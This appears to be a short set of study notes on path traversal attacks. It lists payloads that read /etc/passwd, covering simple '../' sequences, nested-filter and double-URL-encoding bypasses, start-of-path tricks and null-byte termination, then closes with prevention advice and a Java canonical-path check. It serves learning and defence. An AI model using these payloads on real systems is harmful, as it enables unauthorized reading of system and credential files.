### Simple Relative

URL parameters can be escaped

```
../../../etc/passwd
```

---

```
filename=/etc/passwd
```

No need for directory escapes

---

### Nested Filter Bypass

```
....//
```

```
....\/
```

If you remove the ../ or ..\ in between, it defaults to ../ 

```
/image?filename=....//....//....//etc/passwd
```

---

### Double URL Encoded

```
..%252f..%252f..%252fetc/passwd
```

Standard Encoding (%2f for /): Used when the server blocks literal / characters.

Double Encoding (%252f for /):

% itself encodes to %25.

When sent as %252f, a web proxy decodes %25 to %, leaving %2f.

If the backend application decodes the string a second time, %2f becomes /, bypassing the proxy's strict filter.

---

### Validation of start of path

The filename path must start from image root sometimes

```
/var/www/images/../../../etc/passwd
```

---

## Null-Byte termination

An application may require the user-supplied filename to end with an expected file extension, such as `.png`. In this case, it might be possible to use a null byte to effectively terminate the file path before the required extension. For example:

```
filename=../../../etc/passwd%00.png
```

Null Byte 
```
%00
```

---

## How to prevent a path traversal attack

The most effective way to prevent path traversal vulnerabilities is to avoid passing user-supplied input to filesystem APIs altogether. Many application functions that do this can be rewritten to deliver the same behavior in a safer way.

If you can't avoid passing user-supplied input to filesystem APIs, we recommend using two layers of defense to prevent attacks:

- Validate the user input before processing it. Ideally, compare the user input with a whitelist of permitted values. If that isn't possible, verify that the input contains only permitted content, such as alphanumeric characters only.
- After validating the supplied input, append the input to the base directory and use a platform filesystem API to canonicalize the path. Verify that the canonicalized path starts with the expected base directory.

Below is an example of some simple Java code to validate the canonical path of a file based on user input:

`File file = new File(BASE_DIRECTORY, userInput); if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) { // process file }`

---